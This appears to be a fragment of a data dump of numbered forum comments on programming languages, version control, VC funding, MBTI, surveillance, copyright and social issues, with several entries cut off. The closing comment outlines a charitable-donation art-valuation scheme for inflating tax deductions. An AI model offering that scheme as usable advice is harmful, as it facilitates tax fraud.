Putting types into a hierarchy is a\nuseful abstraction sometimes, but there's not some Grand Truth in it -- often,\nattempts at cramming disparate elements into a hierarchy just create extra\ncomplexity. Most systems will keep trying to turn back into graphs unless you\nanchor the hierarchy in a specific context (what does 'a IS-A b' mean,\nreally?), and the context tends to shift with the problem definition.\n\nWorse still, it's the sort of complexity that _looks like work_ , even though\nit's usually more like _flailing in quicksand_.\n\nI think not having to deal with class hierarchies is a big reason why some\npeople find dynamically-typed languages so freeing. I'm still kind of new to\nErlang, but I think its push towards modeling things via a graph of\ncommunicating processes, with a relatively flat type structure, is worth\nconsidering as an alternative. It explicitly focuses on the message protocol\nbetween actors, rather than a tree of subtypes. Granted, I haven't worked a\nlarge enough project to see it break down and get ugly yet. (C++ style OO\nsounds good on paper, too.)\n\nRegardless, it isn't classes per se that lead to OO's problems, but the\ntendency to overuse inheritance. Among statically-typed languages, Haskell's\ntypeclasses seem like another good solution - they break the hierarchy of\ninheritance up into composition of properties.\n\nAlso, the late-binding in OOP means that any class can potentially be\nresponsible for maintaining its invariants even after any of its methods has\nbeen overridden by _any possible future subclasses._ That's not necessarily\ntrue even with dynamically-typed languages.\n\n","120":"Oh, I'm using just ` , not C-`.

Here are a few things to consider.\n\nFirst, we're only talking about language. We get those gendered pronouns not\nbecause of a need to distinguish between how a person views his gender (or how\nthe world views it), but because of stupid linguistic convention going back to\nEnglish's Indo-European roots. You'll see that in many languages in the same\nfamily, nouns all have gender, even absurd ones like \"airplane\" or \"shoe\".\nThese genders have absolutely nothing to do with sexual identity, they're\nessentially randomly assigned, conferring no additional meaning (but providing\na parity check in communication, helping ensure clear transmission). Coming\nfrom this history, we shouldn't be too concerned with the way pronouns\ncorrespond to individual humans.\n\nSecond, I don't think it's hard to imagine socially-undesirable consequences\nof honoring anyone's own claimed gender. I'm thinking of a biological-male\nclaiming to self-identify as female, so that he can use the women's locker\nroom at the gym. So under what circumstances do we want to honor their self-\nimage (or, for that matter, to _believe_ their claimed self-image)?\n\nThird, with identity politics still having legal bearing in our system, it\nseems that self-identification of gender may derail efforts to ensure gender\nequality. Given that there are legal structures in place to protect females,\nmay I (as a biological male) claim to self-identify as female, and achieve\nthose same protections? May I at least self-identify on official forms\n(thereby making enforcement of workplace protections unenforceable)?\n\nNot that these things are insoluble, but I think that we need to give thought\nto the repercussions should we choose to take any person's claims of gender at\nface value.\n\n","300":"And if we're talking about the cost in cycles of the operations for jump\nversus compare, shouldn't we also then consider the cost of the calculation of\nthe pivot points?\n\nI haven't done assembly language in a couple of decades, but it seems to me\nthat the cost of calculating the traditional pivot point will be rather\ncheaper than that for the dual pivots.\n\nAt least back in the day, a division by two was a trivial operation\n(arithmetic shift right by 1), whereas the division by three would require an\nactual calculation: not a _big_ deal, but more expensive than the ASR.\n\n","301":"It's enormously frustrating to me that the Windows platform is so far behind.\n\nI've been researching for a rebuild of our ecommerce site with the idea of a\nmodern microservice architecture.

Nor do they comprehend why it must be fought and how hard it is\nto fight. This is because most Americans haven't been face-to-face with actual\npoverty in 50 years and now that it's creeping up on them in the less\nfortunate reaches of the country, they don't know what is going on.\n\nThe stores in these towns are dying because people don't have money to spend\nin them, and because the stores are dying, people have even less money and\nmore stores have to close. It's a self-accelerating process. Even McDonald's\nis not immune: it's still unaffordable for the truly poor, so as people slide,\nits revenues are going to decline like everything else. Conservatives believe\npoverty is a \"moral medicine\" that toughens up the good and kills off the\nweak. Wrong. It's a cancer.\n\nFor a more ground-level analysis of this, what actually happens during\ncorporate-chain hiring drives is that the individual stores have tight\nseatbelts and the budgets often don't increase. The corporate office may\ndecide to have a \"hiring drive\" but it doesn't increase the stores' budgets.\nThe goal of the \"hiring drive\" is not to increase staffing but to take in new\npeople and fire some, or to ensure that workers who are currently getting\novertime no longer do. (Workers in low-paid hourly positions often love\novertime, but managers don't like having to pay it out.) Thus, hiring new\npeople means that those are there have to take hours cuts or get laid off.\nGenerally, managers would rather keep the people they have than hire someone\nnew and have to cut other peoples' hours, hurting morale across the board. So\nthe incentive structure in such hiring drives is such that very little actual\nhiring will take place. Serious hiring only happens if (a) the budget\nincreases, or (b) people are working overtime and corporate comes down on the\nstore manager for paying out too much time-and-a-half.\n\n","567":"I don't remember and wasn't able to find it either, but I know which study\nyou're talking about.

The statement \"X = X + 1\" is (as a\nmathematical equation) garbage, even though it's legitimate in a conventional\nCS context (whereby '=' represents assignment). So almost all of the students\ninterpreted the code incorrectly.\n\nWhat separated the (future) successes from the failures was not how accurate\ntheir interpretations were, but whether they were consistent. The students who\ncame up with consistent interpretations of these (a priori) meaningless\nsymbols and could rigorously apply them were able to grok programming--\nthrough trial and error, they picked up the actual meanings over time. The\nones who weren't consistent, who just didn't \"get\" that these symbols had\nrigorous and inflexible meanings, were the ones who failed.\n\nI actually think this style of rigor in thinking can be learned, even for\naverage people, but it takes time. You can't go from zero to fluency in one\nsemester. The problem (of American mediocrity in mathematical thinking, at\nleast over the bottom 90 percentiles) is similar to what comes up in\naffirmative action debates: we're addressing it 18 years too late. In the US,\nmany students never encounter mathematical proof or computer programming,\nexcept among the elite (e.g. USAMO, IMO). These aren't impossibly hard.\nBulgarian and Japanese secondary students tackle proofs.

Where\npossible, you simply define the state of widget A to be a function of the\nstate of widget B. Keeping in mind that this is implemented in terms of\nstreams will tell you what function to use to make this specification. In this\nline of thinking, I often think of the system as a static network, where each\nnode (representing a widget) is a pure function converting some inputs to\noutput (or has no input and produce a constant output). A widget can also set\nits appearence based on its input.\n\nWhen the user provides input to a widget (in this model), the corresponding\nnode itself changes to produce a different output (giving you a new, static,\ngraph). For simplicity, I will assume that all user-input widgets correspond\nto output only nodes.\n\nFor example, consider a netwwork, X, with node A corresponding to a textbox. A\ntakes no input, and outputs the constant of the current value of the textbox.\nImagine that we know what the value of the textbox will be at all times, and\nwant to animate the entire window. To do this, we can stream in the values of\nthe textbox, and let the network update itself. In this way the textbox is\nsending a stream of strings into the rest of the network.\n\nMoving to a lower level, consider how the textbox itself is implemented. While\nwe can think of it as output only (as I almost always do), it can be\nimplemented as taking a stream of key-events, and outputing a stream of\nstrings. At this level, I take an event driven perspective. While the textbox\nrecieves a 'stream' of key-events, and outputs a 'stream' of strings, what\nreally happens is that whenever there is a key event, the textbox receives it,\nand emits a string event, in the same way that you might have an onEvent()\nhandler call onStringChange() in a traditioanl OO design.\n\nIn writing this, and re-reading your question, I think the key difference is\nthat I do not view UI elements as a stream. Instead they are static object\nthat streams pass through. As streams pass through them, they be update the\nstream or themselves.\n\n","697":"The reason for giving 90 days is not that some issues are so complicated that\nthey require 90 days to fix, but that bureaucracies can be slow and need a lot\nof extra time.

It also gives you monitoring for each API, again cutting down on the\nthings you have to add to every single API by encapsulating the function in\nthe gateway.\n\nAlso, you can separate your internal API and your external APIs. Maybe you\nhave to always support certain operations to the outside world, but internally\nyou'd really like to change something. By having them separate, you can create\na policy within the gateway to change how the internal calls are done without\nchanging the interface as far as the outside world is concerned.\n\nYou can also do various types of conversion (e.g. REST->SOAP) or even more\nexotic things so that outside devs don't have to care just how weird your\ndamned mainframe is or other aspects of your internal architecture that they\nshouldn't know about.\n\nThe target market is, effectively, anyone who wants to expose internal APIs to\nthe outside world.\n\nSource: I work on an API Gateway and this is how our product works.\n\n","934":"Another open question is how difficult it will be to obtain the different\nAPIs. If NewSDK and ExtremeSDK are both compatible with your system, and both\nfree\/inexpensive, then monopoly conditions may not occur.

Cellular life is divided into\n3 domains: archaea, bacteria, and eukaryote. ALL cellular life is presorted\ninto one of those three domains, and new ones get placed appropriately as\ndiscovered.\n\nActually I must contradict that assertion. It is theoretically possible to\nobserve cellular life that is not adequately described by those three labels.\nIt is highly improbable because the descriptions are the result of thousands\nof man-years of study, and covers everything we've been able to discover so\nfar. But because the definitions are strict and based on empirical\nobservations, it can be done.\n\nIn fact, Achaea is a relatively new sub-category of Prokaryote, because the\nincreasing number of empirical observations stretched the limits of the\nexisting definitions. Scientists found life that failed the Eukaryote test,\nnominally passed the Prokaryote test, but were really sufficiently different\nfrom other Prokaryotes such that a new term was assigned. This is because real\neffort was made to make the definition of Prokaryote strict and precise based\non empirical observations. That leaves open the possibility that unexpected\nobservations (discoveries) will challenge the usefulness of existing\ndefinitions. That won't ever happen with MBTI. You can never take a Meyers-\nBriggs test and have the test fail to categorize. Every test gives you an\nanswer, a personality type that reads like a horoscope. The types are not\nstrict and precise like the definitions of cellular life, they are vague and\ninclusive like your horoscope. You don't read it and think \"interesting new\nknowledge!\" you read it and think \"this is so true! This is me!\"\n\nConsider the human conditions that MBTI fails to identify. It cannot identify\na psychopath. It cannot identify a schizofrenia. It cannot identify alzheimers\ndisease, or any sort of mental illness even due to physical damage to the\nbrain. It cannot, technically even determine whether the subject is human\n(although that could be a reasonable assumption). If this methodology can not\nand will not ever be able to distinguish between recognized psychiatric\ndiseases, is it really reasonable to expect that it can differentiate subtle\npersonality traits based on the results of a questionaire? Is it really\ntelling you anything useful about yourself? You could have a serious,\npotentially dangerous mental condition like bipolar disorder and all the MBTI\nwill tell you is that you \"enjoy being with people.\"\n\nIncidentally whether it's a spectrum or not doesn't change the argument at\nall. A person who scores 50%\/50% introvert\/extrovert is not a discovery.

I use the caveat because\nthere are several ways to interpret it, assuming it is real. (It looks real.)\n\nA few definitions: to \"collect\" means to gather and store; to \"analyze\" means\nthat a computer or human actually does something with the records; to\n\"intercept\" means that a computer or human actually listens to or records\ncalls.\n\n... The NSA, under the FISA Amendments Act, is able to analyze metadata, like\nincoming and outgoing call records, so long as the Attorney General certifies\nthat a particular set of information is useful for reasons of national\nsecurity. Then, the NSA asks the Foreign Intelligence Surveillance Court to\norder that a company comply. As that bill was being ironed out, this step was\nrequested by private companies because they wanted protection from lawsuits in\ncase innocents \u2014 or millions of innocents \u2014 found that the NSA had gathered\ntheir call information.\n\nMy own understanding is that the NSA routinely collects millions of domestic-\nto-domestic phone records. It does not do anything with them unless there is a\nneed to search through them for lawful purposes. That is, an analyst at the\nNSA cannot legally simply perform random searches through the stored data. He\nor she needs to have a reason, usually some intelligence tip. That would allow\nhim or her to segregate the part of the data that's necessary to analyze, and\nproceed from there.\n\nIn a way, it makes sense for the NSA to collect all telephone records because\nit can't know in advance what sections or slices it might need in the future.\nIt does not follow that simply because the NSA collects data that it is legal\nfor the NSA to use the data for foreign intelligence or counter-terrorism\nanalysis._\n\nhttp:\/\/theweek.com\/article\/index\/245228\/the-fbi-collects-all...\n\nThis is written specifically about the telephone call metadata, but being able\nto differentiate exactly what is collected about Internet traffic would also\naid this discussion.

For example, if people were driving at 10mph on average, going 20mph\nwould half their transit time.

But even if we\nconsider only finite lists, as in Standard ML or Scheme, the problem remains\nthat, while list concatenation is associative, it's much less efficient when\nused left-associatively than when used right-associatively. The entire point\nto identifying a monoid structure is that it gives you the freedom to\nreassociate the binary operation however you want. If using this \u201cfreedom\u201d\nwill utterly destroy your program's performance, then you probably won't want\nto use this freedom much - or at least I know I wouldn't.

Maybe run a short 5 second\nidealized simulation in my head and I can predict what might happen. Well then\nI might realize that there was wind that my original model was too idealized.\n\nAnother example someone on HN (or an article posted to HN) talked about how\nwould they be able to predict what happens to a pen dropped on the moon. And\nwhy did Astronauts stood firmly planted on the moon's surface. It was\ninteresting how many people got that wrong. And the difference was that some\nseemed to have been reasoning by analogy or have encoded faulty facts (gravity\nhappens on earth), some by past experiences (they have heavy boots), some that\nhave the correct understanding of first principles can so to speak simulate\nand understand what would happen -- the pen would drop to the moon. Moon has\nsome gravity. So do other planets. And so on.\n\nNow most of these are still based on some principles that we hold true and are\n\"like the past\". Gravity is like yesterday, the fact that winds affects\nobjects in flight is like yesterday, speed of light is like yesterdays. There\nneeds to be wide set of known and predictable rules about the world and then\nderiving or simulating the future can be done.\n\nThere can be something in between, maybe if I built a mental model just\nrecently it gets memoized and instead of re-running it I just remember that it\nis like the \"past one\" but with a small tweak.\n\nAnother mechanism is the \"seeker of inconsistencies\". Something that\nunderstands that these facts together don't make sense. So if I first thought\nthe pencil would float away on the moon and then thought but Astronauts are\nplanted firmly on its surface. This would, so to speak, raise an exception and\nsay \"aha, something is not consistent, pay more attention to this one\".\n\nBut, that is how my brain works. Others brains might work differently.

Fossil uses SQL, which means that all of the\nthings @csswizardry and much more that no git developer has ever thought of..\ncan be done with a little bit of SQL.\n\nBut no, Fossil's UI is like Mercurial's, and it favors merging over cherry-\npicking and rebasing. Their loss!\n\nFossil does have a cherry-pick operation, and anyways, one could trivially be\nconstructed. Which means that rebase can also be constructed easily enough.\nBut my impression is that the devs aren't interested in such contributions.\nAnd the heavy- vs. light-weight branching model in the UI is a big turn off\neven if I can deal with it at the SQL level. Fossil's push\/pull model\n([auto]sync everything) is also not to my liking -- sure, in a corporate\nenvironment pushing every branch is a good idea, but in an open source world\nit's not: I may want to push some branches to one upstream, others to another,\nand yet others not at all.\n\nThis is what I like about git:\n\n\\- the index\n\n\\- git exposes the Merkle hash tree concept at the lowest layer\n\n\\- git branches and tags are just symbolic pointers to commits (see previous\npoint)\n\n\\- support for many remotes\n\n\\- git is not opinionated -- if you want to use a merge-based workflow, you\ncan, and if you want to rebase instead, you can, and if you have to use e-mail\nto exchange commits, you can, and so on.\n\nI'm done with the Mercurial \"you do what we say\" model. A model they keep\nhalf-way reneging on, adding bookmarks (which don't work well), and histedit\nand rebase (why not both in one command?! \"because we don't like git rebase\"\nis the answer I imagine) (they really need to be one command!! what if in the\nprocess of rebasing you must drop commits that you know duplicate others in\nthe new base?!).\n\nI wish Fossil's developers saw this. But they're focused on their needs: VCS\nfor SQLite3. Since they seem to have few topic branches, they like merging.\n\nConversely, since Fossil's devs refuse to be non-opinionated, I wish git's\ndevelopers saw the power of SQL for VCS. It would save a ton of code C and\nshell code, and it would make new extensions trivial. It also would make git\nmuch more power-failure safe: since it could leave that to something like\nSQLite3 that does a fantastic job of it (and is very well tested, both in\ngeneral and as to power failure safety).\n\nBesides this, I wish git has branch history. That is, a single push can push\nmultiple commits by different authors, so it would be nice if one could see\nwho pushed what commits. This would be useful as documentation in and of\nitself: if you see N>1 commits pushed together and need to revert one of them,\nyou might look at whether you need to revert the rest as well, as they might\ngo together. (Some codebases like to push regression tests first, bug fixes\nafter. This allows one to see that tests detect the bugs they're testing for\nand that corresponding bug fixes fix those bugs. If one has to revert a bug\nfix commit, one might have to also revert a corresponding test commit.)\n\n","1813":"TFA said nothing about ECC failing to stop RowHammer.

They're always\ntrying to strike a balance between conflicting goals.\n\nWould any books be written without copyright? Yes, of course \u2013 although the\nlaws go back to the 17th century, so it's hard to argue that there ever was a\ngolden time of freedom, considering the printing press was newish at the time\nand the collective creative output has, even per-capita or GDP-adjusted,\nincreased by about a dozen orders of magnitude.\n\nThe two mechanisms which I consider \"basically sound\" is that (a) financial\nincentives generally work to stimulate creative output. It's not the only\nmotive driving the useful arts, but you'll have a really hard time showing\nthat it's a net-negative, considering that limitless evidence for the efficacy\nof financial incentives.\n\nThe other mechanism is (b) that the restrictions on distribution created by IP\nlaws diminish the actual usefulness of creative output, which includes the\nnumber of people having access to it as one factor.\n\nBoth mechanisms are obvious, yet they work in opposite directions. The total\nbenefit of IP is (simplified) <works created, i. e (a)> * <people reached, i.\ne. (b)>.\n\nThere are some examples for how to avoid this conundrum, such as 'fair use',\nor the government (or interested groups\/individuals) buying IP rights and\ndonating to the public domain. I also believe quite firmly that copyright\nterms of death+70 years are far beyond the point where they create enough\nbenefits in (a) to offset the losses in (b). The situation for patents is a\nbit more murky.\n\n","2181":"This kinda contradicts the idea further up that too much attention is paid to\nprocess, at the detriment of, for lack of a better term, \"skill\" (or \"personal\nresponsibility\")\n\nI think the focus on process can be terribly annoying, because it's so much\neasier to say \"Bob fell asleep at the machine\" than diving into all the events\nthat led up to Bob falling asleep. Note that both can be true or, more\naccurately, the process problems actually need the statement \"bob fell asleep\"\nto be true to make sense.\n\nThe idea to prioritise processes is that it's repeatable. Individual behaviour\nisn't within your control, except for the processes that hired somebody,\neducated them, defined their tasks, and created the environment in which they\nperform these tasks.\n\nIn a small team, or family, or group of friends, it's perfectly fine to dock\nBob's allowance for falling asleep. And the instinct to exact revenge, or\npunish people is strong, because those instincts are the result of evolution\nand norms of society, both of which until recently only knew small groups\nwhere everyone knew everybody. That's why it takes a lot of discipline to act\nagainst these instincts, and obviously, as you said, because focussing on the\nprocess may also uncover others who failed, and it is more tedious.\n\nPeople get frustrated with bureaucracy. Sometimes they're obviously right. But\nthe idea that all bureaucracy is wasteful, or (equally common) that\ngovernments have any particular talent for wasteful bureaucracy is somewhat\nmisguided. Because there aren't many examples for organising teams of\nsometimes hundreds of thousands of people to work on shared goals without a\nwasteful bureaucracy, and governments and the private sector tend not to\ndiffer that much.\n\nI've seen one interesting example of a different structure for organising a\nlarge number of people: capitalism. It arguably works, being excellent at\ndelegating authority to exactly the right person for any possible decision.\nBut I believe even that example isn't convincing, if you start considering all\nthe \"waste\" that capitalism hides in plain sight: advertisement, competing\nefforts doubling work, the complete financial sector, non-monetary losses due\nto financial hardship, the losses from unemployment being essentially wasted\npotential etc.\n\n","2182":"> Perhaps they are, but news also heavily sensationalizes and dramatizises in\n> order to sell clicks.\n\nI don't think that's true if you choose your news with even a modicum of care.\nRead the Economist, and you won't ever hear of starving children. Unless they\nbecome statistically relevant, which points to certain problems with the wish\nfor \"positive news\".\n\nIn other quality outlets, you're more likely to read the human-interest\nstories of crime & suffering. But there's still a vast difference to the\nblatant exploitation of emotion by tabloid.\n\nThat's most pronounced in the decision what to cover, and how much space to\ndevote to it: national newspapers do not splash gruesome sex crimes on A1.\nThey do get mentioned when they rise above what happens every day, but receive\ntreatment in proportion to their relevancy.\n\nYou can argue that some terrorist attack is not relevant to your life, because\nthe chance of dying under such circumstances is still astronomically low. But\nby that standard, almost everything is irrelevant: once a story becomes\ndirectly relevant to you, you're also likely not care about the reports of it\nvery much. Not just for the punny reason that you are dead, but also (if\nyou're less directly involved) because you no longer need to be informed of\nthe event.\n\nThat little contradiction proves the wisdom of the media's long-standing\napproach: they set a low bar, and let readers decide which articles to spend\ntime with.\n\nThere's also an obvious analogy with schooling here: you're unlikely to ever\nneed 90% of what you learn in school. But that's a rather terrible argument\nagainst today's curricular, because, as it turns out, everybody ends up\nneeding 10%, and those 10% rarely overlap.\n\nSimilarly, it'd be a mistake to restrict your news coverage to what's\nimmediately relevant to your life. At the very least, you need some\ninformation on what's going on within the wider community every two years when\nyou're asked to make an informed decision at the ballot box. Because if you\n_don 't_ know what's going on, the only feedback loop connection politicians'\ncareers with their actions is gone.\n\nPeople often struggle with this connection: the act of voting is so small and\nrare, and I am just one of so many. In that way, one feels entirely powerless.\nBut acting on that impression and shutting out bad news, or not voting, still\nrepresents a grave dereliction of duty. Because collectively, that minor act\nis all of it, representing roughly 100% of the legitimacy of democracy.

About the only way I know is that, if you run out of memory and use a\nlot of strings, you can think \u201clet\u2019s give interning a try\u201d.\n\nEven if you know the answer, you cannot tell libraries you use to intern\nstrings they create. So, if your libraries create lots of long-lived strings,\nyou do not have control over whether they intern strings.\n\nAlso, if you do write a library, the call whether to intern or not to intern\nis impossible to make because you cannot know whether your callers prefer\nspeed or memory usage, and whether the objects you return to them will be\nlong-lived.\n\nFor example, if you write a XML parser library, interning tag names may be the\nbest guess, but libraries that do not do that may beat you in short\nbenchmarks.\n\nBecause of that, I think it would be more useful to either have some way to\nglobally install a \u2018should I intern this string?\u2019 handler (but what kind of\ninformation should that get, so that it can make an informed decision?), or to\nhave the garbage collector intern strings as it sees fit.

We'll see!\n\nGood luck on your work with math. Maybe what I typed in here will help; I wish\nI'd known all that when I started.\n\n","2494":"I'm not using the old Visual Basic version 6 or whatever it was -- I never did\nuse it. And I'm not using _Visual Basic script_ , VBS, or whatever it was --\nnever used it either.\n\nI'm using Visual Basic .NET which is essentially equivalent to C# and, thus,\nessentially the most powerful programming language on Windows. Compared with\nC#, Visual Basic .NET is mostly just a different flavor of syntactic sugar.\n\nSo, I have full access to the .NET Framework with ASP.NET, ADO.NET, SQL\nServer, etc. and, thus, have a language quite capable of running a serious\nserver farm.\n\n","2495":"> 1) play coy \/ not describe the product,\n\n\"Play coy\" has nothing to do with it. Holding off the details of the\nannouncement until my Web site is ready to go live and please lots of people\nis important and the reason for not saying more now.\n\n> 2) flog dissatisfaction with VC behavior\n\nOne lesson can learn about VC behavior from my posts is that so far, from all\nI've written that you don't like, no VC likes to hear at all, not a tiny bit.\n\nSo, a lesson for every entrepreneur on HN is that nothing I have written in\nany way covers what is necessary for VC interest.\n\nWhy is this important? VC Web sites commonly emphasize new, advanced\ntechnology, big markets, swinging for the fences, ..., etc. Well, my posts\npromise all of that. But no VCs respond. The same things sent to VCs via\ne-mail have the same results -- dead. The same things sent to VCs via Twitter\n-- same thing.\n\nSo, from what I am writing here, some thing necessary for VC interest is\nmissing.\n\nIMHO: Essentially ALL the information technology VCs are interested in is\ntraction significant and growing rapidly. Essentially everything without that\ntraction goes in the trash. VCs don't want to say this, but entrepreneurs need\nto know it or do what I did -- jerk the chains of nearly every VC on both US\ncoasts with pitches of every style. The responses were essentially all zero;\nessentially the only thing missing was traction.\n\nThat VCs want traction is, thus, a fairly solid conclusion and really\nimportant for entrepreneurs to know about VCs.\n\nWhy are VCs this way? IMHO, the LPs got together and wrote out some severe\ncriteria for VC investments. The criteria are much like in private equity or\ncommercial banking: Only make a financial investment in a financial asset.\nTechnology, algorithms, running code, _secret sauce_ , etc. are all just\nirrelevant. For VC, the LPs are willing to bend a little and call traction\nsignificant and growing rapidly a suitable surrogate for the usual financial\nassets. Entrepreneurs need to know this.\n\nBut for a solo founder with the only capex needed a PC as a first server, the\nLPs rules are too severe.\n\nBut some of the VCs and LPs are making money now.\n\nHere is a secret -- don't tell anyone! If I am successful, then I will have a\nlong track record here on HN saying to the VCs \"I told you so.\" or \"You\nignored me until I had revenue enough to ignore you.\" Or I'll be able to point\nto my posts here as not sufficient for any VC interest. Maybe then, finally,\nthe VCs will be clear on what their criteria are, in one word, traction.\n\n> 3) throw out outrageous $1T numbers,\n\nThere is nothing \"outrageous\" there. Instead it is just simple arithmetic.\n\nIf you are willing to entertain that there is a problem such that nearly\neveryone on the Web will find the first good solution a \"must have\" (e.g.,\nlike horse owners found the Model T), then consider the 1-2 billion users in\nthe more developed countries, that is, where can get some good ad revenue.\nAssume that those people will go for the solution ballpark 3 times a week and\neach time see 50 ordinary ads (the user interface is interactive and\n_iterative_ which is crucial for the core applied math but also good for\nshowing users a lot of ads with, it turns out, quite good ad targeting).\nAssume the relatively good ad targeting. Then compare with the number of\nunique users, the daily user traffic, page views, ad impressions, revenue, and\nmarket cap of Google and Facebook. Done. Nothing at all outrageous.\n\nOr get a lot of eyeball time each week from nearly everyone in the more\ndeveloped countries and, presto, bingo, can monetize to $1T market cap.\n\nSure, a Web site for selling winter sweaters for puppy dogs on line might be\nan okay business, but, as a first step in picking a business idea or project,\npick a problem that nearly everyone has, not just people who have a dog,\ncherish it, and want to walk it in cold weather. I tried to do that; dirt\nsimple tactic.\n\nThe problem? One I had and still have, daily. I believe that essentially\neveryone on the Internet has the same problem. So far there is no good\nsolution.\n\nWhy no solution? Can't get a good solution with only what is common on Sand\nHill Road or in the Stanford, CMU, or MIT CS departments now. My applied math\nis nothing like what the AI\/ML people are doing. I have nothing _neural_. I\ndon't claim that my code is _intelligent_.\n\nNo one screaming for a solution? Well, before the Model T, horse owners were\nnot screaming for the Model T, either. Why not? They could not imagine\nsomething both better and at all realistic. Essentially every horse owner had\nthe problem, and the Model T was the first good solution. Same for my work:\nInternet users have the problem but can't imagine something both better and at\nall realistic.\n\nBesides a big theme in information technology is moving ahead! E.g., in the\nlast few months we have seen 14 TB SSDs, 16 thread consumer processors, and,\nfrom my ISP, download data rates of 100 Mbps up from about 10 Mbps over the\ninterval, with the prices falling quickly. Main memory is going for ballpark\n$10\/GB, one DIMM at a time, retail. Back there, 300 MB of disk storage weighed\n750 pounds and cost $40,000. Big changes. Well, I have in mind another big\nchange but will be not nearly the first.\n\nIn lots of other ways, we have seen big changes. E.g., Amazon: They were an\non-line book and record shop, but consider them now. How'd they do that? Well\nwhen Bezos started, no way was the Internet data rate high enough to permit\nhim to send so many pictures of the products. Now the pictures are so good\nthat shopping in brick and mortar sources does not have better product\ninformation, usually much less good.\n\nBig changes are possible.\n\nBut, I can assure you, essentially no VC in the country sees my $1T and is\ninterested enough for a phone call, an e-mail, or even a Tweet.\n\nE.g., USV just got a new investing partner who posted\n\n> If you\u2019re a founder or potential founder building something\n> transformational, I\u2019m so eager to meet you. I\u2019m on a new adventure and I\u2019m\n> ready to dive into yours, too. You can reach me at Rebecca@USV.com.\n\nSo, I wrote her. Hear back? Nope! And I'm not holding my breath waiting!\n\nSo, why do VCs post such garbage? Curious. Conjecture: They want to maintain\nthe image that they invest in things that are \"transformational\" without\nmentioning traction. So, it's an initial tactic for getting \"deal flow\" and\nthen deal negotiation.\n\n> 4) rile people up with arguments about VB.NET.\n\nWhat's to be riled up about? As a platform, I picked Windows instead of Linux\n-- lots of people and serious organizations have done that.\n\nOn Windows, a key to nearly any software development of production software is\nthe .NET Framework. Okay. Well, Visual Basic .NET can make apparently full use\nof the .NET Framework. Indeed, Microsoft MSDN Web pages documenting the .NET\nFramework, and I have about 5000 of them, are all or nearly all just the same\nfor VB.NET as anything else, including C#.\n\nSo, what's wrong with writing in Visual Basic .NET? I see nothing wrong. What\nis the much better alternative? I see no significantly better alternative.\n\n> Look, it's nice that you got some use out of Microsoft's frankly very\n> irritating old developer tools.\n\nWhat? What \"old developer tools\"? I wrote in Visual Basic .NET which is an\nessentially fully up to date language on Windows and very different from the\nold Visual Basic.\n\nSo, what are you concerned about?\n\n","2496":"But, from what I presented, you are saying that the DNA changes of the last\n50,000 years happened essentially the same and independently in (i) Europe and\n(ii) Asia.\n\nGenerally in evolution is it more likely that DNA twice the same is from a\ncommon ancestor instead of two independent, at least separate, cases of the\nchanges.\n\nFor the influences of climate change, that seemed to vary: My guess is that\nEurope suffered and changed much more from the big ice sheets than Asia. So,\nit would be more likely that the DNA you say came from climate change came\nfrom common ancestors (from still earlier climate change, etc.) than from two\nindependent responses to two (not very similar) climate changes.\n\nSupposedly eyes with lenses and retinas evolved at least twice separately, but\nthat took a very long time and is still considered amazing.\n\n","2497":"When I was writing my undergraduate honors paper on group representations, I\ntried something like your _dependency structure_!

This can lead to an insidious type of data\nloss where some records just appear to be mysteriously missing and are very\nhard to trace.\n\nWhile RMQ states these things in its documentation and obviously is not\nintended to be the system of record, people still abuse it in this way. Redis\nwas abused similarly and responded by growing a full featureset to turn it\ninto a reliable in-memory storage solution. It doesn't seem like that's a good\ntrack for RMQ to take, so they should stick some giant red warning labels all\nover their page, clearly embarrassing those who make these dangerous choices.\n\n","2773":"People are going to jump on the imprecise wording here but this is generally\ncorrect.

One of the design goals was to support efficient compilation given\nvarious constraining dimensions: the need for speedy compilers vs. the need\nfor delivery of applications on standard hardware. Thus a Lisp compiler should\nbe able to generate fast code, even by using whole-program compilation. Thus\nthe language has to take care of a wide range of possible implementations, not\njust one on a particular virtual machine.\n\nClojure OTOH has a relatively straight-forward compiler written in Java, only\ntargetting the JVM in a standard way. The Java\/JVM infrastructure for code\ngeneration (JIT), low-level optimizations (JIT), memory management,\napplication building and delivery could be reused. With all its features and\nlimitations (for example no TCO, fixed JVM instruction set, ...).\n\nCommon Lisp also not only provides some generic operators, but also lots of\nnon-generic operators. One reason for that is the will for backwards\ncompatibility (which was another goal in the Common Lisp design) and the idea\nthat something like Common Lisp is also a low-level languages or provides at\nleast a layer of low-level stuff, functions you would use to implement higher-\nlevel stuff.\n\nCommon Lisp is the next step in the evolution of Lisp I to Lisp 1.5 to Maclisp\nto Zetalisp. Thus it contains much of the core Lisp functions, stuff you can\nread about it the Lisp manuals from 1958 and 1960. People did not want to\nthrow their code away, they wanted a modernized Maclisp. Thus one could port a\n100kloc Lisp program from Maclisp or Zetalisp to Common Lisp without too much\neffort. The main operations were there.\n\nClojure OTOH has almost no backwards compatibility to earlier Lisp dialects.\nPrograms can not be ported from Lisp to Clojure in a useful way. They have to\nbe rewritten. But that was okay, since the main target were not Lisp\ndevelopers, but people who wanted a language with Lisp influence in the\nJava\/JVM eco-system (or possibly other eco-systems too).\n\nThus Common Lisp looks to you like it has less thought put in, where people\nactually struggled to be backwards compatible and modernize the language at\nthe same time.\n\nSo Common Lisp has lots of non-generic functions, a layer of generic non-\nextensible functions (like the sequence layer) and a mechanism for extensible\ngeneric functions (CLOS). Something like CLOS is implemented on-top of the\nnon-generic Lisp, with a few parts using implementation specific mechanims.\nOne does not need to use the primitives of a different host language, because\nCommon Lisp is already capable of hosting with its primitives.\n\n","2794":"It could be different, but might not be.

Well donations were valued at current worth, not\nwhat you paid. So invest large amounts in assets of increasing value (eg art),\nthen a few years late donate the asset to a charity. Asset valuation could be\nmade to grow by the simple expedient of donating large amounts of money to a\ncharity you ran so that it could afford to buy a piece of artwork from you at\ninflated value.

